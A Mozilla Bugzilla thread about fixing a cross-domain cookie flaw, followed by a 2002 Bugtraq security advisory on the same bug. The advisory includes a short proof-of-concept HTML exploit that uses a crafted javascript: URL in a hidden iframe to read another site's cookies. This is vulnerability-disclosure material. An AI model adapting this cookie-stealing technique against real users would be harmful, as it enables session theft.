Comment on [attachment 91152](/attachment.cgi?id=91152 "Possible alternative - safer but slower") [[details]](/attachment.cgi?id=91152&action=edit "Possible alternative - safer but slower") [[diff]](/attachment.cgi?id=91152&action=diff "Possible alternative - safer but slower") [[review]](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=91152)
Possible alternative - safer but slower
r=morse
[Attachment #91152](/attachment.cgi?id=91152&action=edit "Possible alternative - safer but slower") -
Flags: review+

|  | [Johnny Stenback (:jst)](/user_profile?user_id=12352) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=152725#c26)• 23 years ago |
|  | |

Comment on [attachment 91152](/attachment.cgi?id=91152 "Possible alternative - safer but slower") [[details]](/attachment.cgi?id=91152&action=edit "Possible alternative - safer but slower") [[diff]](/attachment.cgi?id=91152&action=diff "Possible alternative - safer but slower") [[review]](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=91152)
Possible alternative - safer but slower
+ nsCOMPtr<nsIURI> uri;
+ nsresult result = ioService->NewURI(nsDependentCString(address),
+ nsnull, nsnull, getter\_AddRefs(uri));
+ if (NS\_FAILED(result))
+ return nsnull;
+ nsCAutoString tempHost;
+ result = uri->GetHost(tempHost);
+ if (NS\_FAILED(result))
+ return nsnull;
+
Since this new code defines a few function scope variable's that are, and
should be, used only for this new code I'd put this code (and the other new
part too) in it's own scope so that it's clear that uri and tempHost are used
only for this check. I.e. add brackets and indent this new code.
sr=jst either way tho...
[Attachment #91152](/attachment.cgi?id=91152&action=edit "Possible alternative - safer but slower") -
Flags: superreview+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=152725#c27)• 23 years ago |
|  | |

Comment on [attachment 91045](/attachment.cgi?id=91045 "Add'l patch - use nsIURIs all the way through") [[details]](/attachment.cgi?id=91045&action=edit "Add'l patch - use nsIURIs all the way through") [[diff]](/attachment.cgi?id=91045&action=diff "Add'l patch - use nsIURIs all the way through") [[review]](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=91045)
Add'l patch - use nsIURIs all the way through
> if (p3p) {
>- p3p->GetConsent(curURL,aHttpChannel,&consent);
>+ nsCAutoString curURLSpec;
>+ if (NS\_FAILED(curURL->GetSpec(curURLSpec)))
GetAsciiSpec() here
sr=dveditz with that change
This looks safe enough to me, but if the drivers are really paranoid about the
branch I don't think the performance hit of the other will be too bad. This one
is definitely the way to go, though, for the future.
[Attachment #91045](/attachment.cgi?id=91045&action=edit "Add'l patch - use nsIURIs all the way through") -
Flags: superreview+

|  | [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)  Assignee |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=152725#c28)• 23 years ago |
|  | |

I'll make those changes.
This has gotten confusing, so let me clarify:
For the trunk, I recommend patch v2 + add'l patch (attachments 89489 and 91045).
For the branch, I recommend "safer but slower" ([attachment 91152](/attachment.cgi?id=91152 "Possible alternative - safer but slower") [[details]](/attachment.cgi?id=91152&action=edit "Possible alternative - safer but slower") [[diff]](/attachment.cgi?id=91152&action=diff "Possible alternative - safer but slower") [[review]](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=91152)).
I need approvals for both.Whiteboard: [adt1 RTM] [ETA 07/13] → [adt1 RTM] [ETA 07/13] [need approvals]

|  | [Heikki Toivonen (remove -bugzilla when emailing directly)](/user_profile?user_id=4030) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=152725#a2059109_4030)• 23 years ago |

Keywords: [adt1.0.1](/buglist.cgi?keywords=adt1.0.1&resolution=---)

|  | [Asa Dotzler [:asa]](/user_profile?user_id=5003) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=152725#c29)• 23 years ago |
|  | |

Comment on [attachment 89489](/attachment.cgi?id=89489 "patch v2") [[details]](/attachment.cgi?id=89489&action=edit "patch v2") [[diff]](/attachment.cgi?id=89489&action=diff "patch v2") [[review]](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=89489)
patch v2
a=asa (on behalf of drivers) for checkin to the 1.1 trunk.
[Attachment #89489](/attachment.cgi?id=89489&action=edit "patch v2") -
Flags: approval+

|  | [Asa Dotzler [:asa]](/user_profile?user_id=5003) |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=152725#c30)• 23 years ago |
|  | |

Comment on [attachment 91045](/attachment.cgi?id=91045 "Add'l patch - use nsIURIs all the way through") [[details]](/attachment.cgi?id=91045&action=edit "Add'l patch - use nsIURIs all the way through") [[diff]](/attachment.cgi?id=91045&action=diff "Add'l patch - use nsIURIs all the way through") [[review]](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=91045)
Add'l patch - use nsIURIs all the way through
a=asa (on behalf of drivers) for checkin to the 1.1 trunk.
[Attachment #91045](/attachment.cgi?id=91045&action=edit "Add'l patch - use nsIURIs all the way through") -
Flags: approval+

|  | [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)  Assignee |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=152725#c31)• 23 years ago |
|  | |

OK, fixed on trunk and branch.Status: REOPENED → RESOLVEDClosed: 23 years ago → 23 years agoKeywords: [adt1.0.1](/buglist.cgi?keywords=adt1.0.1&resolution=---),
[patch](/buglist.cgi?keywords=patch&resolution=---),
[review](/buglist.cgi?keywords=review&resolution=---) → [fixed1.0.1](/buglist.cgi?keywords=fixed1.0.1&resolution=---)Resolution: --- → FIXEDWhiteboard: [adt1 RTM] [ETA 07/13] [need approvals] → [adt1 RTM] [ETA 07/13]

|  | [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)  Assignee |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=152725#c32)• 23 years ago |
|  | |

tever or bindu, please verify this bug on trunk and branch. Use these testcases
(Netscape internal)
<http://warp.mcom.com/u/mstoltz/bugs/152725.html>
<http://warp.mcom.com/u/mstoltz/bugs/152725d.html>
<http://warp.mcom.com/u/mstoltz/bugs/152725f.html>

|  | [Tom Everingham](/user_profile?user_id=6872) |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=152725#c33)• 23 years ago |
|  | |

verified with the supplied testcases on 07/23/02 builds - both trunk and branch,
winNT4, linux rh6, mac osX.Status: RESOLVED → VERIFIEDKeywords: [verified1.0.1](/buglist.cgi?keywords=verified1.0.1&resolution=---)

|  | [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)  Assignee |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=152725#c34)• 23 years ago |
|  | |

\*\*\* [Bug 159152](/show_bug.cgi?id=159152 "VERIFIED DUPLICATE - Javascript can steal cookies from other domains") has been marked as a duplicate of this bug. \*\*\*

|  | [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=152725#a3168727_6444)• 23 years ago |

Group: security?

|  | [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)  Assignee |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=152725#c35)• 22 years ago |
|  | |

Attached patch

[Patch for 0.9.4 branch](attachment.cgi?id=93118&action=diff)
— [Details](attachment.cgi?id=93118&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=93118)

|  | [Jaime Rodriguez, Jr.](/user_profile?user_id=16235) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=152725#a3608707_16235)• 22 years ago |

Keywords: [fixed1.0.1](/buglist.cgi?keywords=fixed1.0.1&resolution=---) → [adt1.0.1+](/buglist.cgi?keywords=adt1.0.1%2B&resolution=---)
You need to [log in](/show_bug.cgi?id=152725&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from seclists.org_13ab5600_20250125_144548.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![bugtraq logo](/images/bugtraq-logo.png)](/bugtraq/)
## [Bugtraq](/bugtraq/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](259)
[By Date](date.html#260)
[![Next](/images/right-icon-16x16.png)](261)

[![Previous](/images/left-icon-16x16.png)](326)
[By Thread](index.html#260)
[![Next](/images/right-icon-16x16.png)](261)

![](/shared/images/nst-icons.svg#search)

# Mozilla cookie stealing - Sandblad advisory #9

---

*From*: Andreas Sandblad <sandblad () acc umu se>

*Date*: Wed, 24 Jul 2002 16:45:59 +0200 (CEST)

---

```

                  - Sandblad advisory #9 -

---..---..---..---..---..---..---..---..---..---..---..---..----
Title:      Steal/spoof arbitrary cookie in Mozilla
Date:       [2002-07-24]
Software:   Mozilla
Vendor:     <http://www.mozilla.org>
Fix:        The author has been working with Mozilla
            to produce a patch. Problem is fixed in
            Mozilla 1.1 Beta released 02-07-22.
Workaround: Preferences->Advanced->Scripts & Plugins->
            Disable access to cookies using javascript
Impact:     Steal/spoof arbitrary cookie           _     _
            using javascript: URLs               o' \,=./ `o
Author:     Andreas Sandblad, sandblad () acc umu se   (o o)
---=--=---=--=--=---=--=--=--=--=---=--=--=-----ooO--(_)--Ooo---

BACKGROUND:
===========

I orginally thought this was a XSS (cross site scripting) issue, but soon
came to the conclusion that it is limited to a design error in restricting
access to cookies. Even though Mozilla is open source, I have not been
studying the source code in order to find and exploit the vulnerability.

In the beginning I had problems not generating any javascript errors when
using the javascript URL. My first solution was to make the host and path
to be a valid javascript expression. Google.com may be a valid expression
if google is an object and com is an element/variable of the Google
object. Further on if Google.com is an int, it is legal to use google.com/
1. Parsing of host and path will stop when a space is found.

Well, I soon found a much easier solution. Simply put a // in front of the
host and path and a \n before the cookie reading code accour. The reason
why I didn't find this directly was because the newline must be created in
a javascript function. It can't be set directly in a javascript url.

DESCRIPTION:
============

Mozilla allows script in the javascript protocoll to set and read cookies.
For javascript URLs the host and path for the cookie is pulled out as:
"javascript:[host][path]"

Cookie security is based only on restricting access to correct matching
host and path. By carefully crafting a mallicious javascript URL opened in
a new frame/iframe/window, it is possible to access and alter cookies from
other domains.

DETAILS:
========

The easiest way to exploit the vulnerability is to simply create a
javascript URL in a javascript function as:
javascript://[host]/[path]\n[code to read cookie]
The // will make sure host and path don't generate any javascript errors.

EXPLOIT:
========

Instructions:
Put the exploit in a html document on a remote server and load it with
your Mozilla browser to activate the exploit.

-------------------------- CUT HERE ----------------------------
<pre>
Title:      Mozilla cookie stealing/spoofing
Date:       [2002-07-24]
Impact:     Steal/spoof arbitrary cookie           _     _
            using javascript: URLs               o' \,=./ `o
Author:     Andreas Sandblad, sandblad () acc umu se   (o o)
---=--=---=--=--=---=--=--=--=--=---=--=--=-----ooO--(_)--Ooo---
This demo will display your google cookie (must exist).
</pre>

<body onload=init()>
<iframe name=f height=0 width=0 style=visibility:hidden></iframe>
<script>
function init(){
  f.location = "javascript://www.google.com/\n"+
    "'<body onload=alert(document.cookie)>'";
}
</script>
-------------------------- CUT HERE ----------------------------

Disclaimer:
===========
Andreas Sandblad is not responsible for the misuse of the
information provided in this advisory. The opinions expressed
are my own and not of any company. In no event shall the author
be liable for any damages whatsoever arising out of or in
connection with the use or spread of this advisory. Any use of
the information is at the user's own risk.

Old advisories:
===============
#8 [2002-07-23] "Pressing CTRL in IE is dangerous"
<http://online.securityfocus.com/archive/1/283866>
#7 [2002-05-19] "IE dot bug"
<http://online.securityfocus.com/archive/1/273168>
#6 [2002-05-15] "Opera javascript protocoll vulnerability"
<http://online.securityfocus.com/archive/1/272583>
#5 [2002-04-26] "Mp3 file can execute code in Winamp."
<http://online.securityfocus.com/archive/1/269724>
#4 [2002-04-15] "Using the backbutton in IE is dangerous."
<http://online.securityfocus.com/archive/1/267561>

Greetings:
==========
For feedback concerning this issue:
Ingesson, Quitta, Hawkan.
For feedback I forgot to thank for, regarding last advisory:
Tys0n-

Feedback:
=========
Please send suggestions and comments to:           _     _
sandblad () acc umu se                              o' \,=./ `o
                                                    (o o)
---=--=---=--=--=---=--=--=--=--=---=--=--=-----ooO--(_)--Ooo---
Andreas Sandblad,
student in Engineering Physics at Umea University, Sweden.
-/---/---/---/---/---/---/---/---/---/---/---/---/---/---/---/--

```

---

[![Previous](/images/left-icon-16x16.png)](259)
[By Date](date.html#260)
[![Next](/images/right-icon-16x16.png)](261)

[![Previous](/images/left-icon-16x16.png)](326)
[By Thread](index.html#260)
[![Next](/images/right-icon-16x16.png)](261)

### Current thread:

* **Mozilla cookie stealing - Sandblad advisory #9** *Andreas Sandblad (Jul 24)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


